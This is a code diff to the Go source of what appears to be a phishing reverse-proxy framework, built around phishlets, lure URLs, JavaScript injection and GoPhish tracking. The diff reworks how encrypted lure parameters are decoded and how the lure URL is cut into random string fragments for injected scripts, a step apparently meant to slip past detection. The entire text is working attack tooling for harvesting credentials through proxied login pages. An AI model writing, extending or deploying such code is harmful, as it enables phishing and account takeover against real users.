@@ -11,13 +11,11 @@ import (
 	"bufio"
 	"bytes"
 	"crypto/rand"
-	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"html"
 	"io"
 	"io/ioutil"
 	"net"
@@ -245,7 +243,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("js_inject: script not found: '%s'", js_id)
 							}
 							d_body = strings.Replace(d_body, "{hostname}", p.cfg.PhishletConfig(pl.Name).Hostname, -1)
-							d_body = strings.Replace(d_body, "{enc_url}", s.EncryptParams(s.Params), -1)
+							d_body = strings.Replace(d_body, "{enc_url}", EncryptUrlParams("", s.Params), -1)
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
 							return req, resp
 						} else {
@@ -386,7 +384,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									// set params from url arguments
-									p.extractParams(session, req.URL)
+									session.ExtractLureParams(req.URL)
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										if trackParam, ok := session.Params["o"]; ok {
@@ -513,7 +511,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, p.cfg.PhishletConfig(pl_name).Hostname, &s.Params)
+											body = p.replaceHtmlParams(body, lure_url, s)
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
@@ -592,7 +590,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// redirect from lure path to login url
 						s, ok := p.sessions[ps.SessionId]
 						if ok {
-							rurl := s.ReplaceParams(pl.GetLoginUrl(), &s.Params)
+							rurl := s.ReplaceSessionParams(pl.GetLoginUrl())
 							u, err := url.Parse(rurl)
 							if err == nil {
 								if strings.ToLower(req_path) != strings.ToLower(u.Path) {
@@ -1597,86 +1595,11 @@ func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	return false
 }
 
-func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
-	var ret bool = false
-	vals := u.Query()
+func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, s *Session) string {
 
-	var enc_key string
-
-	for _, v := range vals {
-		if len(v[0]) > 8 {
-			enc_key = v[0][:8]
-			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
-			if err == nil {
-				dec_params := make([]byte, len(enc_vals)-1)
-
-				var crc byte = enc_vals[0]
-				c, _ := rc4.NewCipher([]byte(enc_key))
-				c.XORKeyStream(dec_params, enc_vals[1:])
-
-				var crc_chk byte
-				for _, c := range dec_params {
-					crc_chk += byte(c)
-				}
-
-				if crc == crc_chk {
-					params, err := url.ParseQuery(string(dec_params))
-					if err == nil {
-						for kk, vv := range params {
-							log.Debug("param: %s='%s'", kk, vv[0])
-
-							session.Params[kk] = vv[0]
-						}
-						ret = true
-						break
-					}
-				} else {
-					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
-				}
-			} else {
-				log.Debug("extractParams: %s", err)
-			}
-		}
-	}
-	/*
-		for k, v := range vals {
-			if len(k) == 2 {
-				// possible rc4 encryption key
-				if len(v[0]) == 8 {
-					enc_key = v[0]
-					break
-				}
-			}
-		}
-
-		if len(enc_key) > 0 {
-			for k, v := range vals {
-				if len(k) == 3 {
-					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-					if err == nil {
-						dec_params := make([]byte, len(enc_vals))
-
-						c, _ := rc4.NewCipher([]byte(enc_key))
-						c.XORKeyStream(dec_params, enc_vals)
-
-						params, err := url.ParseQuery(string(dec_params))
-						if err == nil {
-							for kk, vv := range params {
-								log.Debug("param: %s='%s'", kk, vv[0])
-
-								session.Params[kk] = vv[0]
-							}
-							ret = true
-							break
-						}
-					}
-				}
-			}
-		}*/
-	return ret
-}
-
-func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, hostname string, params *map[string]string) string {
+	lure_url_raw := lure_url
+	u, _ := url.Parse(lure_url)
+	orig_hostname, _ := p.replaceHostWithOriginal(u.Host)
 
 	// generate forwarder parameter
 	t := make([]byte, 5)
@@ -1688,43 +1611,29 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, hostname str
 	t[0] = crc
 	fwd_param := base64.RawURLEncoding.EncodeToString(t)
 
-	body = strings.Replace(body, "{lure_url_raw}", lure_url, -1)
-	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
+	lure_url += "?" + strings.ToLower(GenRandomString(3)) + "=" + fwd_param
 
-	for k, v := range *params {
-		key := "{" + k + "}"
-		body = strings.Replace(body, key, html.EscapeString(v), -1)
-	}
 	var js_url string
 	n := 0
 	for n < len(lure_url) {
 		t := make([]byte, 1)
 		rand.Read(t)
 		rn := int(t[0])%3 + 1
-
 		if rn+n > len(lure_url) {
 			rn = len(lure_url) - n
 		}
-
 		if n > 0 {
 			js_url += " + "
 		}
 		js_url += "'" + lure_url[n:n+rn] + "'"
-
 		n += rn
 	}
 
-	var lure_b64 = base64.StdEncoding.EncodeToString([]byte(lure_url))
-	var lure_enc string
-	for _,v := range lure_b64 {
-		lure_enc = string(v) + lure_enc
-	}
-
+	body = s.ReplaceSessionParams(body)
+	body = strings.Replace(body, "{lure_url_raw}", lure_url_raw, -1)
 	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
-	body = strings.Replace(body, "{hostname}", hostname, -1)
-	u, _ := url.Parse(lure_url)
-	orig_hostname, _ := p.replaceHostWithOriginal(u.Host)
+	body = strings.Replace(body, "{hostname}", u.Host, -1)
 	body = strings.Replace(body, "{orig_hostname}", orig_hostname, -1)
 
 	return body
